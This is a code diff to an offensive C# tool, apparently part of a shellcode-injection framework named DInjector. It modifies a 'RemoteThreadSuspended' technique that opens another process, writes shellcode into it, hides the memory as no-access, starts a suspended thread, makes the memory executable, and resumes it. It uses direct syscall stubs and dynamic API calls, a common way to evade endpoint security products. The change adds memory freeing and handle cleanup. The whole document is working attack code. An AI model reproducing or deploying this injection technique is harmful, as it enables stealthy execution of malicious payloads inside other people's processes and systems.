@@ -58,6 +58,16 @@ namespace DInjector
             IntPtr ThreadHandle,
             ref uint SuspendCount);
 
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate DI.Data.Native.NTSTATUS NtFreeVirtualMemory(
+            IntPtr processHandle,
+            ref IntPtr baseAddress,
+            ref IntPtr regionSize,
+            uint freeType);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate bool CloseHandle(IntPtr hObject);
+
         [StructLayout(LayoutKind.Sequential, Pack = 0)]
         struct OBJECT_ATTRIBUTES
         {
@@ -74,6 +84,12 @@ namespace DInjector
         {
             public IntPtr UniqueProcess;
             public IntPtr UniqueThread;
+        }
+
+        private static void closeHandle(IntPtr hObject)
+        {
+            object[] parameters = { hObject };
+            _ = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref parameters);
         }
 
         public static void Execute(byte[] shellcodeBytes, int processID)
@@ -99,13 +115,9 @@ namespace DInjector
                 ref ci);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(RemoteThreadSuspended) [+] NtOpenProcess");
-            }
             else
-            {
                 Console.WriteLine($"(RemoteThreadSuspended) [-] NtOpenProcess: {ntstatus}");
-            }
 
             #endregion
 
@@ -126,13 +138,9 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(RemoteThreadSuspended) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
-            }
             else
-            {
                 Console.WriteLine($"(RemoteThreadSuspended) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
-            }
 
             #endregion
 
@@ -154,13 +162,9 @@ namespace DInjector
                 ref bytesWritten);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(RemoteThreadSuspended) [+] NtWriteVirtualMemory");
-            }
             else
-            {
                 Console.WriteLine($"(RemoteThreadSuspended) [-] NtWriteVirtualMemory: {ntstatus}");
-            }
 
             Marshal.FreeHGlobal(buffer);
 
@@ -179,13 +183,9 @@ namespace DInjector
                 out uint _);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(RemoteThreadSuspended) [+] NtProtectVirtualMemory, PAGE_NOACCESS");
-            }
             else
-            {
                 Console.WriteLine($"(RemoteThreadSuspended) [-] NtProtectVirtualMemory, PAGE_NOACCESS: {ntstatus}");
-            }
 
             #endregion
 
@@ -210,13 +210,9 @@ namespace DInjector
                 IntPtr.Zero);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(RemoteThreadSuspended) [+] NtCreateThreadEx, CREATE_SUSPENDED");
-            }
             else
-            {
                 Console.WriteLine($"(RemoteThreadSuspended) [-] NtCreateThreadEx, CREATE_SUSPENDED: {ntstatus}");
-            }
 
             #endregion
 
@@ -239,13 +235,9 @@ namespace DInjector
                 out uint _);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(RemoteThreadSuspended) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
-            }
             else
-            {
                 Console.WriteLine($"(RemoteThreadSuspended) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
-            }
 
             #endregion
 
@@ -261,15 +253,34 @@ namespace DInjector
                 ref suspendCount);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(RemoteThreadSuspended) [+] NtResumeThread");
-            }
             else
-            {
                 Console.WriteLine($"(RemoteThreadSuspended) [-] NtResumeThread: {ntstatus}");
-            }
 
             #endregion
+
+            #region NtFreeVirtualMemory (shellcode)
+
+            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtFreeVirtualMemory");
+            NtFreeVirtualMemory sysNtFreeVirtualMemory = (NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtFreeVirtualMemory));
+
+            regionSize = IntPtr.Zero;
+
+            ntstatus = sysNtFreeVirtualMemory(
+                hProcess,
+                ref baseAddress,
+                ref regionSize,
+                DI.Data.Win32.Kernel32.MEM_RELEASE);
+
+            if (ntstatus == 0)
+                Console.WriteLine("(RemoteThreadSuspended) [+] NtFreeVirtualMemory");
+            else
+                Console.WriteLine($"(RemoteThreadSuspended) [-] NtFreeVirtualMemory: {ntstatus}");
+
+            #endregion
+
+            closeHandle(hThread);
+            closeHandle(hProcess);
         }
     }
 }
